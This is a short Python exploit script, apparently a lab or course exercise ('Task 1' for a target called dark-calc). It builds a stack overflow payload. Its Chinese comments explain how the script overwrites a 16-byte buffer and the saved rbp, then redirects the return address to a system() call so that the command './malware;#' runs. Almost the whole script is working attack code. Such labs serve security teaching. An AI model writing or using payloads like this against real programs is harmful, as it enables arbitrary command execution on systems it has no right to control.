#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc."""
import sys
import struct

# input() 的缓冲区在 rbp-0x10，共 16 字节；随后是保存的 rbp（8 字节）和返回地址（8 字节）。
# 把返回地址改成 0x401a6b（eval 中 "mov $command_buf,%edi; call system" 处），
# 这样 input 直接返回进入 system(command_buf)，跳过 eval 的 "echo $((" 拼接。
payload = b"./malware;#" + b" " * 5          # 前 16 字节：command_buf 的内容
payload += b"B" * 8                          # 覆盖保存的 rbp
payload += struct.pack("<Q", 0x401A6B)       # 覆盖返回地址

sys.stdout.buffer.write(payload + b"\n")
